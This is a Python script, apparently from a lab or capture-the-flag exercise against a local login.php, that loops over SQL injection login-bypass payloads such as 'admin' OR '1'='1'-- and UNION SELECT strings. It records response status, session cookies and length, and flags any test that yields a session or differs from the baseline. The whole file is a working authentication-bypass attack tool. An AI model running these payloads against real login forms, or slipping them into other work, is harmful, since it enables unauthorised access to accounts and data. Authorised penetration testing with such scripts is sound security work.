import requests
import time

target_url = "http://127.0.0.1:33167/login.php"
session = requests.Session()

payloads = [
    ("admin", "admin", "baseline"),
    ("admin' OR '1'='1'--", "", "SQLi_1"),
    ("admin'--", "", "SQLi_2"),
    ("admin'#", "", "SQLi_3"),
    ("' OR 1=1--", "", "SQLi_4"),
    ("' OR '1'='1", "", "SQLi_5"),
    ("admin' AND '1'='1'--", "", "SQLi_6"),
    ("admin' UNION SELECT null,null--", "", "SQLi_7"),
    ("admin' UNION SELECT 1,2--", "", "SQLi_8"),
    ("", "", "empty_creds"),
    ("admin", " ", "whitespace"),
    ("ADMIN", "ADMIN", "uppercase")
]

print("Test | PayloadType      | Status | Cookie | Length")
print("-" * 60)

results = []

for i, (username, password, name) in enumerate(payloads, 1):
    try:
        # Clear cookies between tests
        session.cookies.clear()
        
        # Increased timeout
        response = session.post(
            target_url,
            data={"username": username, "password": password},
            timeout=30,
            allow_redirects=False
        )
        
        has_cookie = 'PHPSESSID' in response.cookies
        length = len(response.text)
        status = response.status_code
        
        result_line = f"{i:2d}   | {name:<16} | {status:>3d}    | {str(has_cookie):<6} | {length:>6}"
        print(result_line)
        
        results.append({
            'test': i,
            'name': name,
            'username': username,
            'password': password,
            'status': status,
            'has_cookie': has_cookie,
            'length': length,
            'cookies': dict(response.cookies),
            'response': response.text[:500] if len(response.text) > 500 else response.text
        })
        
        # Brief pause to avoid overwhelming the server
        time.sleep(0.5)
        
    except Exception as e:
        error_result = f"{i:2d}   | {name:<16} | ERROR  |        | {str(e)[:20]}"
        print(error_result)
        results.append({
            'test': i,
            'name': name,
            'status': 'ERROR',
            'error': str(e)
        })

# Summary
print("\n" + "="*60)
print("ANALYSIS:")
print("="*60)

successful = [r for r in results if isinstance(r.get('status'), int) and r.get('has_cookie')]

if successful:
    print(f"[!] SUCCESS DETECTED in {len(successful)} test(s):")
    for r in successful:
        print(f"\n[!] Test {r['test']} ({r['name']}): STATUS={r['status']}")
        print(f"    Username: {repr(r['username'])}")
        print(f"    Password: {repr(r['password'])}")
        print(f"    Cookies: {r['cookies']}")
        print(f"    Response preview: {r['response'][:100]}...")
else:
    print("[-] No successful authentication detected.")
    print("\n[?] Check for anomalies:")
    valid_results = [r for r in results if isinstance(r.get('status'), int)]
    if valid_results:
        lengths = [r['length'] for r in valid_results]
        statuses = [r['status'] for r in valid_results]
        print(f"    Status codes: {set(statuses)}")
        print(f"    Length range: {min(lengths)} - {max(lengths)} bytes")
        print(f"    Baseline (Test 1): {valid_results[0]['length']} bytes")
        
        # Show any responses that differ from baseline
        baseline_len = valid_results[0]['length']
        anomalies = [r for r in valid_results if r['length'] != baseline_len]
        if anomalies:
            print(f"\n[!] {len(anomalies)} anomaly(s) detected:")
            for a in anomalies:
                print(f"    Test {a['test']} ({a['name']}): {a['length']} bytes")
